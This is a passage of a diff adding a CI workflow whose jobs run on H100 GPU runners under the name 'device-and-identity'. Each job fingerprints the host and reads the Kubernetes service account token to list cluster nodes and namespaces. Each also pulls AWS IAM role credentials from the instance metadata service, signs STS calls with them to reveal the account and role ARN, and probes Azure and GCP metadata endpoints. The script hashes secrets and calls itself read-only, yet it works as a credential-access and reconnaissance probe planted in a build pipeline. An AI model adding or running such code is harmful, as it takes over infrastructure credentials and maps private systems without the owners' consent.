+          echo "AZURE_IMDS_STATUS=$(curl -sS -o /tmp/c211_az.json -w '%{http_code}' --max-time 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo ERR)"
+          echo "GCP_METADATA_STATUS=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/id' 2>/dev/null || echo ERR)"
+          echo "C211_DENSE_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  h100x2-a:
+    runs-on: 2-gpu-h100
+    timeout-minutes: 15
+    steps:
+      - name: device-and-identity
+        env:
+          NONCE: c211-i124924-df7c4e8eed018c58
+          JOBTAG: h100x2-a
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_DENSE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          echo "--- gpu identity nvidia (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_QUERY_FAILED
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "--- gpu identity amd (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -120 || echo ROCM_SMI_FAILED
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            timeout 40 amd-smi static 2>&1 | head -160 || echo AMD_SMI_FAILED
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          echo "--- k8s presence + read-only inventory ---"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then echo "K8S_SA_TOKEN_PRESENT=1"; else echo "K8S_SA_TOKEN_PRESENT=0"; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset} KUBERNETES_SERVICE_PORT=${KUBERNETES_SERVICE_PORT:-unset}"
+          echo "K8S_SA_NAMESPACE=$(cat $SA/namespace 2>/dev/null || echo none) K8S_SA_CA_PRESENT=$([ -e $SA/ca.crt ] && echo 1 || echo 0)"
+          if [ -s "$SA/token" ] && command -v curl >/dev/null 2>&1; then
+            KH="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
+            KP="${KUBERNETES_SERVICE_PORT:-443}"
+            code=$(curl -sS -o /tmp/c211_nodes.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/nodes?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NODES_STATUS=$code"
+            if [ "$code" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_nodes.json'))
+          items=d.get('items') or []
+          print('K8S_NODE_COUNT',len(items))
+          tot=0; gpu=[]
+          for n in items:
+              md=n.get('metadata') or {}; al=((n.get('status') or {}).get('allocatable') or {})
+              g=al.get('nvidia.com/gpu')
+              try: gi=int(g)
+              except Exception: gi=0
+              tot+=gi
+              lab=md.get('labels') or {}
+              prod=lab.get('nvidia.com/gpu.product') or lab.get('amd.com/gpu.product') or ''
+              if gi or prod: gpu.append((md.get('name'),gi,prod))
+          print('K8S_GPU_ALLOCATABLE_TOTAL',tot)
+          for x in gpu[:40]: print('K8S_GPU_NODE',x[0],x[1],x[2])
+          " 2>&1 | head -50 || echo K8S_PARSE_SKIPPED
+            fi
+            code2=$(curl -sS -o /tmp/c211_ns.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/namespaces?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NAMESPACES_STATUS=$code2"
+            if [ "$code2" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_ns.json'))
+          items=d.get('items') or []
+          print('K8S_NAMESPACE_COUNT',len(items))
+          print('K8S_NAMESPACE_NAMES',','.join([(x.get('metadata') or {}).get('name','') for x in items])[:900])
+          " 2>&1 | head -5 || echo K8S_NS_PARSE_SKIPPED
+            fi
+          else
+            echo K8S_INVENTORY_SKIPPED
+          fi
+          echo "--- imdsv2 + sts fingerprint (read-only) ---"
+          T2=""
+          if command -v curl >/dev/null 2>&1; then
+            T2=$(curl -sS --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          fi
+          if [ -n "${T2:-}" ]; then echo "IMDS_TOKEN_PRESENT=1"; else echo "IMDS_TOKEN_PRESENT=0"; fi
+          echo "IMDSV1_CONTROL_INSTANCE_ID=$(curl -sS --max-time 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | head -c 80 || true)"
+          IMDS(){ curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $T2" "http://169.254.169.254/latest/$1" 2>/dev/null || true; }
+          if [ -n "${T2:-}" ]; then
+            echo "IMDS_INSTANCE_ID=$(IMDS meta-data/instance-id | head -c 80)"
+            echo "IMDS_INSTANCE_TYPE=$(IMDS meta-data/instance-type | head -c 80)"
+            echo "IMDS_AZ=$(IMDS meta-data/placement/availability-zone | head -c 80)"
+            echo "IMDS_IAM_INFO=$(IMDS meta-data/iam/info | head -c 400)"
+            ROLE=$(IMDS meta-data/iam/security-credentials/ | head -1)
+            echo "IMDS_ROLE=$ROLE"
+            if [ -n "$ROLE" ]; then
+              IMDS "meta-data/iam/security-credentials/$ROLE" > /tmp/c211_creds.json 2>/dev/null || true
+              if command -v python3 >/dev/null 2>&1; then
+                python3 -c "
+          import json,hashlib
+          try: d=json.load(open('/tmp/c211_creds.json'))
+          except Exception as e:
+              print('CRED_PARSE_FAIL',str(e)[:120]); raise SystemExit
+          f=lambda v: hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          print('CRED_FIELDS',json.dumps({'AccessKeyId_fp':f(d.get('AccessKeyId')),'SecretAccessKey_fp':f(d.get('SecretAccessKey')),'Token_fp':f(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+          " 2>&1 | head -3 || echo CRED_PARSE_SKIPPED
+                python3 -c "
+          import json,hashlib,hmac,datetime,urllib.request,urllib.error,re
+          d=json.load(open('/tmp/c211_creds.json'))
+          ak,sk,tk=d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token')
+          def sts(ak,sk,tk):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc); amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tk: creq+='x-amz-security-token:%s\n'%tk; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,'us-east-1')
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,'us-east-1','sts','aws4_request'): k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)}
+              if tk: h['X-Amz-Security-Token']=tk
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  x=urllib.request.urlopen(r,timeout=8); return x.status,x.read().decode()
+              except urllib.error.HTTPError as e: return e.code,e.read().decode()
+              except Exception as e: return -1,str(e)[:160]
+          if not ak or not sk: print('STS_NO_CREDS'); raise SystemExit
+          s,b=sts(ak,sk,tk)
+          m=re.search(r'<Arn>([^<]+)</Arn>',b); a=re.search(r'<Account>([^<]+)</Account>',b); u=re.search(r'<UserId>([^<]+)</UserId>',b)
+          print('STS_STATUS',s,'STS_ARN',m.group(1) if m else None,'STS_ACCOUNT',a.group(1) if a else None,'STS_USERID_fp',hashlib.sha256((u.group(1) if u else '').encode()).hexdigest()[:16])
+          if s!=200: print('STS_BODY',(b or '').replace(chr(10),' ')[:300])
+          s2,b2=sts(ak,str(sk)+'TAMPERED',tk)
+          m2=re.search(r'<Code>([^<]+)</Code>',b2)
+          print('STS_TAMPERED_STATUS',s2,'STS_TAMPERED_CODE',m2.group(1) if m2 else None)
+          " 2>&1 | head -6 || echo STS_SKIPPED
+              fi
+            fi
+          fi
+          echo "--- other-cloud metadata (presence only) ---"
+          echo "AZURE_IMDS_STATUS=$(curl -sS -o /tmp/c211_az.json -w '%{http_code}' --max-time 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo ERR)"
+          echo "GCP_METADATA_STATUS=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/id' 2>/dev/null || echo ERR)"
+          echo "C211_DENSE_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  h100x2-b:
+    runs-on: 2-gpu-h100
+    timeout-minutes: 15
+    steps:
+      - name: device-and-identity
+        env:
+          NONCE: c211-i124924-df7c4e8eed018c58
+          JOBTAG: h100x2-b
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_DENSE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          echo "--- gpu identity nvidia (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_QUERY_FAILED
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "--- gpu identity amd (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -120 || echo ROCM_SMI_FAILED
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            timeout 40 amd-smi static 2>&1 | head -160 || echo AMD_SMI_FAILED
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          echo "--- k8s presence + read-only inventory ---"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then echo "K8S_SA_TOKEN_PRESENT=1"; else echo "K8S_SA_TOKEN_PRESENT=0"; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset} KUBERNETES_SERVICE_PORT=${KUBERNETES_SERVICE_PORT:-unset}"
+          echo "K8S_SA_NAMESPACE=$(cat $SA/namespace 2>/dev/null || echo none) K8S_SA_CA_PRESENT=$([ -e $SA/ca.crt ] && echo 1 || echo 0)"
+          if [ -s "$SA/token" ] && command -v curl >/dev/null 2>&1; then
+            KH="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
+            KP="${KUBERNETES_SERVICE_PORT:-443}"
+            code=$(curl -sS -o /tmp/c211_nodes.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/nodes?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NODES_STATUS=$code"
+            if [ "$code" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_nodes.json'))
+          items=d.get('items') or []
+          print('K8S_NODE_COUNT',len(items))
+          tot=0; gpu=[]
+          for n in items:
+              md=n.get('metadata') or {}; al=((n.get('status') or {}).get('allocatable') or {})
+              g=al.get('nvidia.com/gpu')
+              try: gi=int(g)
+              except Exception: gi=0
+              tot+=gi
+              lab=md.get('labels') or {}
+              prod=lab.get('nvidia.com/gpu.product') or lab.get('amd.com/gpu.product') or ''
+              if gi or prod: gpu.append((md.get('name'),gi,prod))
+          print('K8S_GPU_ALLOCATABLE_TOTAL',tot)
+          for x in gpu[:40]: print('K8S_GPU_NODE',x[0],x[1],x[2])
+          " 2>&1 | head -50 || echo K8S_PARSE_SKIPPED
+            fi
+            code2=$(curl -sS -o /tmp/c211_ns.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/namespaces?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NAMESPACES_STATUS=$code2"
+            if [ "$code2" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_ns.json'))
+          items=d.get('items') or []
+          print('K8S_NAMESPACE_COUNT',len(items))
+          print('K8S_NAMESPACE_NAMES',','.join([(x.get('metadata') or {}).get('name','') for x in items])[:900])
+          " 2>&1 | head -5 || echo K8S_NS_PARSE_SKIPPED
+            fi
+          else
+            echo K8S_INVENTORY_SKIPPED
+          fi
+          echo "--- imdsv2 + sts fingerprint (read-only) ---"
+          T2=""
+          if command -v curl >/dev/null 2>&1; then
+            T2=$(curl -sS --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          fi
+          if [ -n "${T2:-}" ]; then echo "IMDS_TOKEN_PRESENT=1"; else echo "IMDS_TOKEN_PRESENT=0"; fi
+          echo "IMDSV1_CONTROL_INSTANCE_ID=$(curl -sS --max-time 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | head -c 80 || true)"
+          IMDS(){ curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $T2" "http://169.254.169.254/latest/$1" 2>/dev/null || true; }
+          if [ -n "${T2:-}" ]; then
+            echo "IMDS_INSTANCE_ID=$(IMDS meta-data/instance-id | head -c 80)"
+            echo "IMDS_INSTANCE_TYPE=$(IMDS meta-data/instance-type | head -c 80)"
+            echo "IMDS_AZ=$(IMDS meta-data/placement/availability-zone | head -c 80)"
+            echo "IMDS_IAM_INFO=$(IMDS meta-data/iam/info | head -c 400)"
+            ROLE=$(IMDS meta-data/iam/security-credentials/ | head -1)
+            echo "IMDS_ROLE=$ROLE"
+            if [ -n "$ROLE" ]; then
+              IMDS "meta-data/iam/security-credentials/$ROLE" > /tmp/c211_creds.json 2>/dev/null || true
+              if command -v python3 >/dev/null 2>&1; then
+                python3 -c "
+          import json,hashlib
+          try: d=json.load(open('/tmp/c211_creds.json'))
+          except Exception as e:
+              print('CRED_PARSE_FAIL',str(e)[:120]); raise SystemExit
+          f=lambda v: hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          print('CRED_FIELDS',json.dumps({'AccessKeyId_fp':f(d.get('AccessKeyId')),'SecretAccessKey_fp':f(d.get('SecretAccessKey')),'Token_fp':f(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+          " 2>&1 | head -3 || echo CRED_PARSE_SKIPPED
+                python3 -c "
+          import json,hashlib,hmac,datetime,urllib.request,urllib.error,re
+          d=json.load(open('/tmp/c211_creds.json'))
+          ak,sk,tk=d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token')
+          def sts(ak,sk,tk):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc); amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tk: creq+='x-amz-security-token:%s\n'%tk; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,'us-east-1')
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,'us-east-1','sts','aws4_request'): k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)}
+              if tk: h['X-Amz-Security-Token']=tk
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  x=urllib.request.urlopen(r,timeout=8); return x.status,x.read().decode()
+              except urllib.error.HTTPError as e: return e.code,e.read().decode()
+              except Exception as e: return -1,str(e)[:160]
+          if not ak or not sk: print('STS_NO_CREDS'); raise SystemExit
+          s,b=sts(ak,sk,tk)
+          m=re.search(r'<Arn>([^<]+)</Arn>',b); a=re.search(r'<Account>([^<]+)</Account>',b); u=re.search(r'<UserId>([^<]+)</UserId>',b)
+          print('STS_STATUS',s,'STS_ARN',m.group(1) if m else None,'STS_ACCOUNT',a.group(1) if a else None,'STS_USERID_fp',hashlib.sha256((u.group(1) if u else '').encode()).hexdigest()[:16])
+          if s!=200: print('STS_BODY',(b or '').replace(chr(10),' ')[:300])
+          s2,b2=sts(ak,str(sk)+'TAMPERED',tk)
+          m2=re.search(r'<Code>([^<]+)</Code>',b2)
+          print('STS_TAMPERED_STATUS',s2,'STS_TAMPERED_CODE',m2.group(1) if m2 else None)
+          " 2>&1 | head -6 || echo STS_SKIPPED
+              fi
+            fi
+          fi
+          echo "--- other-cloud metadata (presence only) ---"
+          echo "AZURE_IMDS_STATUS=$(curl -sS -o /tmp/c211_az.json -w '%{http_code}' --max-time 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo ERR)"
+          echo "GCP_METADATA_STATUS=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/id' 2>/dev/null || echo ERR)"
+          echo "C211_DENSE_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  h100x1:
+    runs-on: 1-gpu-h100
+    timeout-minutes: 15
+    steps:
+      - name: device-and-identity
+        env:
+          NONCE: c211-i124924-df7c4e8eed018c58
+          JOBTAG: h100x1
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_DENSE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          echo "--- gpu identity nvidia (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_QUERY_FAILED
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "--- gpu identity amd (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -120 || echo ROCM_SMI_FAILED
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            timeout 40 amd-smi static 2>&1 | head -160 || echo AMD_SMI_FAILED
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          echo "--- k8s presence + read-only inventory ---"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then echo "K8S_SA_TOKEN_PRESENT=1"; else echo "K8S_SA_TOKEN_PRESENT=0"; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset} KUBERNETES_SERVICE_PORT=${KUBERNETES_SERVICE_PORT:-unset}"
+          echo "K8S_SA_NAMESPACE=$(cat $SA/namespace 2>/dev/null || echo none) K8S_SA_CA_PRESENT=$([ -e $SA/ca.crt ] && echo 1 || echo 0)"
+          if [ -s "$SA/token" ] && command -v curl >/dev/null 2>&1; then
+            KH="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
+            KP="${KUBERNETES_SERVICE_PORT:-443}"
+            code=$(curl -sS -o /tmp/c211_nodes.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/nodes?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NODES_STATUS=$code"
+            if [ "$code" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_nodes.json'))
+          items=d.get('items') or []
+          print('K8S_NODE_COUNT',len(items))
+          tot=0; gpu=[]
+          for n in items:
+              md=n.get('metadata') or {}; al=((n.get('status') or {}).get('allocatable') or {})
+              g=al.get('nvidia.com/gpu')
+              try: gi=int(g)
+              except Exception: gi=0
+              tot+=gi
+              lab=md.get('labels') or {}
+              prod=lab.get('nvidia.com/gpu.product') or lab.get('amd.com/gpu.product') or ''
+              if gi or prod: gpu.append((md.get('name'),gi,prod))
+          print('K8S_GPU_ALLOCATABLE_TOTAL',tot)
+          for x in gpu[:40]: print('K8S_GPU_NODE',x[0],x[1],x[2])
+          " 2>&1 | head -50 || echo K8S_PARSE_SKIPPED
+            fi
+            code2=$(curl -sS -o /tmp/c211_ns.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/namespaces?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NAMESPACES_STATUS=$code2"
+            if [ "$code2" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_ns.json'))
+          items=d.get('items') or []
+          print('K8S_NAMESPACE_COUNT',len(items))
+          print('K8S_NAMESPACE_NAMES',','.join([(x.get('metadata') or {}).get('name','') for x in items])[:900])
+          " 2>&1 | head -5 || echo K8S_NS_PARSE_SKIPPED
+            fi
+          else
+            echo K8S_INVENTORY_SKIPPED
+          fi
+          echo "--- imdsv2 + sts fingerprint (read-only) ---"
+          T2=""
+          if command -v curl >/dev/null 2>&1; then
+            T2=$(curl -sS --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          fi
+          if [ -n "${T2:-}" ]; then echo "IMDS_TOKEN_PRESENT=1"; else echo "IMDS_TOKEN_PRESENT=0"; fi
+          echo "IMDSV1_CONTROL_INSTANCE_ID=$(curl -sS --max-time 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | head -c 80 || true)"
+          IMDS(){ curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $T2" "http://169.254.169.254/latest/$1" 2>/dev/null || true; }
+          if [ -n "${T2:-}" ]; then
+            echo "IMDS_INSTANCE_ID=$(IMDS meta-data/instance-id | head -c 80)"
+            echo "IMDS_INSTANCE_TYPE=$(IMDS meta-data/instance-type | head -c 80)"
+            echo "IMDS_AZ=$(IMDS meta-data/placement/availability-zone | head -c 80)"
+            echo "IMDS_IAM_INFO=$(IMDS meta-data/iam/info | head -c 400)"
+            ROLE=$(IMDS meta-data/iam/security-credentials/ | head -1)
+            echo "IMDS_ROLE=$ROLE"
+            if [ -n "$ROLE" ]; then
+              IMDS "meta-data/iam/security-credentials/$ROLE" > /tmp/c211_creds.json 2>/dev/null || true
+              if command -v python3 >/dev/null 2>&1; then
+                python3 -c "
+          import json,hashlib
+          try: d=json.load(open('/tmp/c211_creds.json'))
+          except Exception as e:
+              print('CRED_PARSE_FAIL',str(e)[:120]); raise SystemExit
+          f=lambda v: hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          print('CRED_FIELDS',json.dumps({'AccessKeyId_fp':f(d.get('AccessKeyId')),'SecretAccessKey_fp':f(d.get('SecretAccessKey')),'Token_fp':f(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+          " 2>&1 | head -3 || echo CRED_PARSE_SKIPPED
+                python3 -c "
+          import json,hashlib,hmac,datetime,urllib.request,urllib.error,re
+          d=json.load(open('/tmp/c211_creds.json'))
+          ak,sk,tk=d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token')
+          def sts(ak,sk,tk):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc); amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tk: creq+='x-amz-security-token:%s\n'%tk; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,'us-east-1')
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,'us-east-1','sts','aws4_request'): k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)}
+              if tk: h['X-Amz-Security-Token']=tk
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  x=urllib.request.urlopen(r,timeout=8); return x.status,x.read().decode()
+              except urllib.error.HTTPError as e: return e.code,e.read().decode()
+              except Exception as e: return -1,str(e)[:160]
+          if not ak or not sk: print('STS_NO_CREDS'); raise SystemExit
+          s,b=sts(ak,sk,tk)
+          m=re.search(r'<Arn>([^<]+)</Arn>',b); a=re.search(r'<Account>([^<]+)</Account>',b); u=re.search(r'<UserId>([^<]+)</UserId>',b)
+          print('STS_STATUS',s,'STS_ARN',m.group(1) if m else None,'STS_ACCOUNT',a.group(1) if a else None,'STS_USERID_fp',hashlib.sha256((u.group(1) if u else '').encode()).hexdigest()[:16])
+          if s!=200: print('STS_BODY',(b or '').replace(chr(10),' ')[:300])
+          s2,b2=sts(ak,str(sk)+'TAMPERED',tk)
+          m2=re.search(r'<Code>([^<]+)</Code>',b2)
+          print('STS_TAMPERED_STATUS',s2,'STS_TAMPERED_CODE',m2.group(1) if m2 else None)
